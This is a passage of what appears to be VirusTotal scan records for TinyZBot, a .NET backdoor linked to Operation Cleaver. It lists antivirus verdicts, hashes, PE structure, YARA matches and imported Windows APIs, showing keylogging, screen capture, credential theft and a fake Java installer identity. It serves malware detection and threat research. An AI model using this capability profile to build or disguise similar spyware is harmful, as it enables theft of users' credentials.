        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "Backdoor:MSIL/Tnzbt.bc3aec39"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25618",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.Win32.TzeeBot.djryoj"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Win32.S.Agent.68608.DC"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Backdoor.Tnzbt!8.80DD (CLOUD)"
        },
        "Ad-Aware": {
          "method": "blacklist",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.21.193",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2022-08-15.02",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Backdoor/W32.DN-Tnzbt.68608"
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "1.4.1.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Mal/Generic-R + Troj/Bckdr-RSL"
        },
        "Comodo": {
          "method": "blacklist",
          "engine_name": "Comodo",
          "engine_version": "34899",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Malware@#3pdf4ylmbd81f"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.978.51",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.56.4040",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BackDoor.Siggen.58338"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4689",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Backdoor.Tnzbt.Win32.17"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BKDR_TEEZBOT.A"
        },
        "McAfee-GW-Edition": {
          "method": "blacklist",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BehavesLike.Win32.Packed.kh"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "3.5.48.101",
          "engine_update": "20220707",
          "category": "malicious",
          "result": "malicious.high.ml.score"
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2021.5.0.7597",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830 (B)"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "22.2.1.2",
          "engine_update": "20220330",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Backdoor.MSIL.eigk"
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "TR/Spy.Gen"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan/Generic.ASMalwS.3E79"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win32.Hack.MSIL.j.(kcloud)"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.89.174",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Ransom.Win32.Zbot.oa!s1"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.19500.2",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "TrojanSpy:MSIL/Tzeebot.A"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20220813",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.33757B:27.28453",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1660554034",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Detected"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.22.1.10283",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan/Win32.FakeMS.R127237"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.108",
          "engine_update": "20220426",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan-FFJV!9376E5B754CC"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "malware (ai score=100)"
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.3.3.37",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Malware.AI.3593347007"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trj/CI.A"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "BKDR_TEEZBOT.A"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Msil.Backdoor.Tnzbt.Hsig"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20220725",
          "category": "malicious",
          "result": "Backdoor.Tnzbt!FKwhaaExpso"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.0.26.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.MSIL.Spy"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "MSIL/TzeeBot.A!tr.spy"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20220810",
          "category": "malicious",
          "result": "Gen:NN.ZemsilF.34592.em0@a0to@al"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "MSIL:Tzeebot-B [Trj]"
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "MSIL:Tzeebot-B [Trj]"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20220418",
          "category": "malicious",
          "result": "win/malicious_confidence_90% (W)"
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "220815-00",
          "engine_update": "20220815",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20220208",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20220103",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20220815",
          "category": "type-unsupported",
          "result": null
        }
      },
      "creation_date": 1363025274,
      "ssdeep": "1536:u6qNrwPdkX8Z5YzxlweRxRSOW0izl6ip4HNIlp29np6kukO:u69dkXA5Yz8eRaciDO9nMkO",
      "pe_info": {
        "timestamp": 1363025274,
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "machine_type": 332,
        "entry_point": 74382,
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "chi2": 65179.43,
            "filetype": "unknown",
            "entropy": 3.2801175117492676,
            "sha256": "2292769331fad1aecc1157d8c875f948b0a08a6a4965906244b7a97841326a08",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 1
        },
        "resource_types": {
          "RT_VERSION": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 490126.06,
            "virtual_address": 8192,
            "flags": "rx",
            "raw_size": 66560,
            "entropy": 7.04,
            "virtual_size": 66196,
            "md5": "67e9a578f3d479ec8f3271fab131eca7"
          },
          {
            "name": ".rsrc",
            "chi2": 111293.5,
            "virtual_address": 81920,
            "flags": "r",
            "raw_size": 1024,
            "entropy": 2.8,
            "virtual_size": 880,
            "md5": "6cb366e80d6c533267fc85d0238664a8"
          },
          {
            "name": ".reloc",
            "chi2": 128015,
            "virtual_address": 90112,
            "flags": "r",
            "raw_size": 512,
            "entropy": 0.1,
            "virtual_size": 12,
            "md5": "689e3941a76607e3c6541194a637a387"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "crowdsourced_yara_results": [
        {
          "ruleset_id": "0000cef893",
          "rule_name": "OPCLEAVER_TinyZBot",
          "ruleset_name": "apt_op_cleaver",
          "description": "Tiny Bot used by attackers in Operation Cleaver",
          "author": "Cylance Inc.",
          "source": "https://github.com/Neo23x0/signature-base"
        }
      ],
      "first_submission_date": 1417525563,
      "size": 68608,
      "trid": [
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 60.4
        },
        {
          "file_type": "Windows screen saver",
          "probability": 10.8
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 8.6
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 5.4
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 4.1
        }
      ],
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ]
    }
  }
},
{
  "_id": {
    "$oid": "65baca6a1ae6cefdf2180d73"
  },
  "data": {
    "id": "4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1"
    },
    "attributes": {
      "crowdsourced_yara_results": [
        {
          "description": "Tiny Bot used by attackers in Operation Cleaver",
          "author": "Cylance Inc.",
          "ruleset_name": "apt_op_cleaver",
          "rule_name": "OPCLEAVER_TinyZBot",
          "ruleset_id": "0000cef893",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "ruleset_id": "0000cef893",
          "rule_name": "OPCLEAVER_TinyZBot",
          "ruleset_name": "apt_op_cleaver",
          "description": "Tiny Bot used by attackers in Operation Cleaver",
          "author": "Cylance Inc.",
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "ruleset_id": "00f69a1b91",
          "rule_name": "Multifamily_RAT_Detection",
          "ruleset_name": "rat_detection",
          "description": "Generic Detection for multiple RAT families, PUPs, Packers and suspicious executables",
          "author": "Lucas Acha (http://www.lukeacha.com)",
          "source": "https://github.com/securitymagic/yara"
        }
      ],
      "last_analysis_date": 1660502109,
      "first_submission_date": 1408992857,
      "sandbox_verdicts": {
        "DAS-Security Orcas": {
          "category": "malicious",
          "sandbox_name": "DAS-Security Orcas",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "vhash": "217036755514f01f61733fe8121e",
      "reputation": -36,
      "dot_net_assembly": {
        "strongname_va": 0,
        "external_assemblies": {
          "System.Drawing": {
            "version": "2.0.0.0"
          },
          "System": {
            "version": "2.0.0.0"
          },
          "System.Xml": {
            "version": "2.0.0.0"
          },
          "mscorlib": {
            "version": "2.0.0.0"
          },
          "System.Web.Services": {
            "version": "2.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "2.0.0.0"
          }
        },
        "tables_rows_map": "1f160016d01f502d9222351671a0008140ae02749081633100100600003220a0",
        "tables_present_map": "b093db63f57",
        "manifest_resource": [
          "TinyZBot.ErrorForm.resources",
          "TinyZBot.ErrorMessage.resources",
          "TinyZBot.Properties.Resources.resources"
        ],
        "tables_rows_map_log": "498aaa4a887956678678445576",
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "metadata_header_rva": 17761540,
        "external_modules": [
          "user32.dll",
          "User32.dll",
          "kernel32.dll",
          "advapi32.dll",
          "crypt32.dll",
          "winhttp.dll",
          "kernel32",
          "gdi32.dll"
        ],
        "assembly_flags": 3,
        "entry_point_rva": 8840,
        "entry_point_token": 100663297,
        "assembly_name": "netscp.exe",
        "resources_va": 17752700,
        "assembly_data": {
          "majorversion": 1,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 0,
          "flags": 0,
          "revisionnumber": 0,
          "name": "netscp"
        },
        "streams": {
          "#~": {
            "chi2": 634556.5625,
            "size": 22896,
            "entropy": 5.6780171394348145,
            "md5": "4a90aad99077165b8d6dce1f3e953689"
          },
          "#Strings": {
            "chi2": 216265.53125,
            "size": 20884,
            "entropy": 5.042510032653809,
            "md5": "ef177f7c5754a8f7ef8cd681373d1e29"
          },
          "#US": {
            "chi2": 1107408.25,
            "size": 17340,
            "entropy": 4.008631229400635,
            "md5": "473c428f58e3fa836bacac9319d16754"
          },
          "#GUID": {
            "chi2": 240,
            "size": 16,
            "entropy": 4,
            "md5": "54d9fc41cdd08b9d0ef94c4506795ea4"
          },
          "#Blob": {
            "chi2": 50863.25390625,
            "size": 8604,
            "entropy": 5.909395217895508,
            "md5": "756884cfe2e308c2cd60719b728366de"
          }
        },
        "tables_present": 26,
        "clr_version": "v2.0.50727",
        "unmanaged_methods": {
          "kernel32": [
            "BeginUpdateResource",
            "UpdateResource",
            "EndUpdateResource"
          ],
          "crypt32.dll": [
            "CryptUnprotectData"
          ],
          "user32.dll": [
            "FindWindow",
            "SetForegroundWindow",
            "SetClipboardViewer",
            "SendMessage",
            "ChangeClipboardChain",
            "SetWindowsHookEx",
            "UnhookWindowsHookEx",
            "CallNextHookEx",
            "ToUnicodeEx",
            "GetKeyboardState",
            "MapVirtualKeyEx",
            "GetKeyboardLayout",
            "AttachThreadInput",
            "MapVirtualKey",
            "GetDesktopWindow",
            "GetWindowDC",
            "ReleaseDC",
            "GetWindowRect",
            "SetWinEventHook",
            "GetForegroundWindow",
            "GetWindowText"
          ],
          "kernel32.dll": [
            "GetModuleHandle",
            "GetCurrentThreadId",
            "LoadLibrary",
            "GetProcAddress",
            "FreeLibrary",
            "LoadLibraryEx",
            "FindResource",
            "LoadResource",
            "SizeofResource"
          ],
          "gdi32.dll": [
            "BitBlt",
            "CreateCompatibleBitmap",
            "CreateCompatibleDC",
            "DeleteDC",
            "DeleteObject",
            "SelectObject"
          ],
          "advapi32.dll": [
            "CredEnumerateW"
          ],
          "User32.dll": [
            "GetForegroundWindow",
            "GetWindowThreadProcessId"
          ],
          "winhttp.dll": [
            "WinHttpGetIEProxyConfigForCurrentUser"
          ]
        },
        "clr_meta_version": "1.1",
        "type_definition_list": [
          {
            "namespace": "System.Drawing.Imaging",
            "type_definitions": [
              "ImageFormat",
              "ImageCodecInfo",
              "Encoder",
              "EncoderParameters",
              "EncoderParameter",
              "PixelFormat"
            ]
          },
          {
            "namespace": "System",
            "type_definitions": [
              "Object",
              "IDisposable",
              "MulticastDelegate",
              "EventArgs",
              "Enum",
              "ValueType",
              "IAsyncResult",
              "AsyncCallback",
              "Guid",
              "DateTime",
              "Action`1",
              "Type",
              "Exception",
              "IntPtr",
              "String",
              "Environment",
              "Int32",
              "Array",
              "Delegate",
              "UIntPtr",
              "Byte",
              "Char",
              "BitConverter",
              "ArgumentException",
              "ArgumentNullException",
              "InvalidOperationException",
              "ArgumentOutOfRangeException",
              "Version",
              "SystemException",
              "Math",
              "RuntimeFieldHandle",
              "EventHandler",
              "RuntimeTypeHandle",
              "Random",
              "OperatingSystem",
              "Int16",
              "Buffer",
              "StringSplitOptions",
              "STAThreadAttribute",
              "Console",
              "GC",
              "Activator",
              "Boolean",
              "Uri",
              "StringComparison",
              "Convert"
            ]
          },
          {
            "namespace": "System.Runtime.InteropServices",
            "type_definitions": [
              "MarshalAsAttribute",
              "UnmanagedType",
              "OutAttribute",
              "InAttribute",
              "ComVisibleAttribute",
              "GuidAttribute",
              "DllImportAttribute",
              "Marshal",
              "StructLayoutAttribute",
              "LayoutKind",
              "UnmanagedFunctionPointerAttribute",
              "CallingConvention",
              "ComImportAttribute",
              "TypeLibTypeAttribute",
              "DispIdAttribute",
              "TypeLibFuncAttribute"
            ]
          },
          {
            "namespace": "Microsoft.Win32",
            "type_definitions": [
              "Registry",
              "RegistryKey"
            ]
          },
          {
            "namespace": "System.Timers",
            "type_definitions": [
              "Timer",
              "ElapsedEventArgs",
              "ElapsedEventHandler"
            ]
          },
          {
            "namespace": "System.Reflection",
            "type_definitions": [
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyCultureAttribute",
              "AssemblyVersionAttribute",
              "AssemblyFileVersionAttribute",
              "Assembly",
              "AssemblyName",
              "BindingFlags",
              "Binder"
            ]
          },
          {
            "namespace": "System.Text.RegularExpressions",
            "type_definitions": [
              "Match",
              "MatchEvaluator",
              "GroupCollection",
              "Group",
              "Regex"
            ]
          },
          {
            "namespace": "System.Xml.Serialization",
            "type_definitions": [
              "XmlElementAttribute"
            ]
          },
          {
            "namespace": "System.Collections.ObjectModel",
            "type_definitions": [
              "ReadOnlyCollection`1"
            ]
          },
          {
            "namespace": "System.CodeDom.Compiler",
            "type_definitions": [
              "GeneratedCodeAttribute"
            ]
          },
          {
            "namespace": "System.Net.NetworkInformation",
            "type_definitions": [
              "NetworkInterface",
              "PhysicalAddress",
              "IPInterfaceProperties",
              "UnicastIPAddressInformationCollection",
              "UnicastIPAddressInformation",
              "IPAddressInformation"
            ]
          },
          {
            "namespace": "System.Web.Services",
            "type_definitions": [
              "WebServiceBindingAttribute"
            ]
          },
          {
            "namespace": "System.Resources",
            "type_definitions": [
              "ResourceManager"
            ]
          },
          {
            "namespace": "uncategorized",
            "type_definitions": [
              "DebuggingModes",
              "SpecialFolder",
              "Enumerator",
              "ControlCollection",
              "Enumerator"
            ]
          },
          {
            "namespace": "System.Text",
            "type_definitions": [
              "StringBuilder",
              "Encoding"
            ]
          },
          {
            "namespace": "System.Runtime.CompilerServices",
            "type_definitions": [
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "CompilerGeneratedAttribute",
              "MethodImplAttribute",
              "MethodImplOptions",
              "RuntimeHelpers"
            ]
          },
          {
            "namespace": "System.Threading",
            "type_definitions": [
              "Thread",
              "SendOrPostCallback",
              "ThreadStart",
              "Interlocked",
              "Monitor",
              "Mutex",
              "ManualResetEvent",
              "EventWaitHandle"
            ]
          },
          {
            "namespace": "System.Collections.Generic",
            "type_definitions": [
              "List`1",
              "KeyValuePair`2",
              "IList`1",
              "Dictionary`2",
              "IEnumerable`1",
              "IEnumerator`1"
            ]
          },
          {
            "namespace": "System.Net",
            "type_definitions": [
              "IPAddress",
              "IPHostEntry",
              "Dns",
              "IPEndPoint",
              "EndPoint",
              "WebProxy",
              "NetworkCredential",
              "ICredentials",
              "IWebProxy",
              "ServicePointManager"
            ]
          },
          {
            "namespace": "System.Configuration",
            "type_definitions": [
              "ApplicationSettingsBase",
              "SettingsBase",
              "ApplicationScopedSettingAttribute",
              "SpecialSettingAttribute",
              "SpecialSetting",
              "DefaultSettingValueAttribute"
            ]
          },
          {
            "namespace": "System.Globalization",
            "type_definitions": [
              "CultureInfo"
            ]
          },
          {
            "namespace": "System.Net.Sockets",
            "type_definitions": [
              "Socket",
              "AddressFamily",
              "SocketType",
              "ProtocolType",
              "SelectMode"
            ]
          },
          {
            "namespace": "System.Web.Services.Protocols",
            "type_definitions": [
              "SoapHttpClientProtocol",
              "WebClientProtocol",
              "HttpWebClientProtocol",
              "SoapDocumentMethodAttribute",
              "InvokeCompletedEventArgs"
            ]
          },
          {
            "namespace": "System.Security.Principal",
            "type_definitions": [
              "WindowsIdentity"
            ]
          },
          {
            "namespace": "System.IO",
            "type_definitions": [
              "Stream",
              "BinaryReader",
              "BinaryWriter",
              "SeekOrigin",
              "TextReader",
              "File",
              "DirectoryInfo",
              "StreamReader",
              "MemoryStream",
              "InvalidDataException",
              "FileStream",
              "Directory",
              "FileInfo",
              "FileNotFoundException",
              "StreamWriter",
              "TextWriter",
              "Path",
              "FileMode"
            ]
          },
          {
            "namespace": "System.Diagnostics",
            "type_definitions": [
              "DebuggableAttribute",
              "Process",
              "ProcessStartInfo",
              "ProcessModule",
              "DataReceivedEventArgs",
              "ProcessWindowStyle",
              "DataReceivedEventHandler",
              "FileVersionInfo",
              "DebuggerStepThroughAttribute",
              "DebuggerNonUserCodeAttribute"
            ]
          },
          {
            "namespace": "System.Collections",
            "type_definitions": [
              "IEnumerator"
            ]
          },
          {
            "namespace": "System.Drawing",
            "type_definitions": [
              "Bitmap",
              "Image",
              "Point",
              "Size",
              "SizeF",
              "Graphics",
              "Rectangle",
              "CopyPixelOperation"
            ]
          },
          {
            "namespace": "System.ComponentModel",
            "type_definitions": [
              "AsyncCompletedEventArgs",
              "IContainer",
              "ISupportInitialize",
              "DesignerCategoryAttribute",
              "EditorBrowsableAttribute",
              "EditorBrowsableState"
            ]
          },
          {
            "namespace": "System.Windows.Forms",
            "type_definitions": [
              "NativeWindow",
              "Form",
              "Message",
              "Keys",
              "PictureBox",
              "Button",
              "RichTextBox",
              "KeyEventHandler",
              "KeyEventArgs",
              "SendKeys",
              "Clipboard",
              "CreateParams",
              "IDataObject",
              "DataFormats",
              "Control",
              "PictureBoxSizeMode",
              "ButtonBase",
              "IButtonControl",
              "ContainerControl",
              "AutoScaleMode",
              "FormBorderStyle",
              "FormStartPosition",
              "Application",
              "Screen"
            ]
          },
          {
            "namespace": "System.Security.Cryptography",
            "type_definitions": [
              "CryptoStream",
              "HMAC",
              "SymmetricAlgorithm",
              "HashAlgorithm",
              "RandomNumberGenerator",
              "ICryptoTransform",
              "MD5",
              "CryptographicException",
              "CryptoStreamMode",
              "PaddingMode",
              "CipherMode",
              "KeyedHashAlgorithm",
              "RijndaelManaged"
            ]
          },
          {
            "namespace": "System.Drawing.Drawing2D",
            "type_definitions": [
              "CompositingQuality",
              "InterpolationMode",
              "SmoothingMode"
            ]
          }
        ],
        "unmanaged_method_list": [
          {
            "name": "kernel32",
            "methods": [
              "BeginUpdateResource",
              "UpdateResource",
              "EndUpdateResource"
            ]
          },
          {
            "name": "crypt32.dll",
            "methods": [
              "CryptUnprotectData"
            ]
          },
          {
            "name": "user32.dll",
            "methods": [
              "FindWindow",
              "SetForegroundWindow",
              "SetClipboardViewer",
              "SendMessage",
              "ChangeClipboardChain",
              "SetWindowsHookEx",
              "UnhookWindowsHookEx",
              "CallNextHookEx",
              "ToUnicodeEx",
              "GetKeyboardState",
              "MapVirtualKeyEx",
              "GetKeyboardLayout",
              "AttachThreadInput",
              "MapVirtualKey",
              "GetDesktopWindow",
              "GetWindowDC",
              "ReleaseDC",
              "GetWindowRect",
              "SetWinEventHook",
              "GetForegroundWindow",
              "GetWindowText"
            ]
          },
          {
            "name": "kernel32.dll",
            "methods": [
              "GetModuleHandle",
              "GetCurrentThreadId",
              "LoadLibrary",
              "GetProcAddress",
              "FreeLibrary",
              "LoadLibraryEx",
              "FindResource",
              "LoadResource",
              "SizeofResource"
            ]
          },
          {
            "name": "gdi32.dll",
            "methods": [
              "BitBlt",
              "CreateCompatibleBitmap",
              "CreateCompatibleDC",
              "DeleteDC",
              "DeleteObject",
              "SelectObject"
            ]
          },
          {
            "name": "advapi32.dll",
            "methods": [
              "CredEnumerateW"
            ]
          },
          {
            "name": "User32.dll",
            "methods": [
              "GetForegroundWindow",
              "GetWindowThreadProcessId"
            ]
          },
          {
            "name": "winhttp.dll",
            "methods": [
              "WinHttpGetIEProxyConfigForCurrentUser"
            ]
          }
        ]
      },
      "signature_info": {
        "product": "Platform SE 7 U25",
        "description": "Platform SE binary",
        "file version": "7.0.250.17",
        "original name": "Setup.exe",
        "comments": "Platform SE binary",
        "internal name": "Setup.exe",
        "copyright": "Copyright © 2013"
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly",
      "times_submitted": 11,
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "last_modification_date": 1699363944,
      "packers": {
        "PEiD": ".NET executable"
      },
      "dot_net_guids": {
        "typelib_id": "48ec61b7-3301-45e3-bc29-c1b4e28ffeeb",
        "mvid": "608d8a5a-d818-4c47-963f-15df15ef60ba"
      },
      "type_description": "Win32 EXE",
      "last_analysis_stats": {
        "malicious": 56,
        "suspicious": 0,
        "undetected": 15,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "type_tag": "peexe",
      "type_extension": "exe",
      "first_seen_itw_date": 1408434907,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Tnzbt.m!c"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.41",
          "engine_update": "20220728",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "0.105.1.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Win.Trojan.TinyZBot-1"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Generic.mg.6ef950941d114c09"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Agent.CleaverBinder"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Unsafe"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4689",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Trojan.TzeeBot.Win32.1"
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.14.0.0",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "[ARMADILLO V1.71]"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
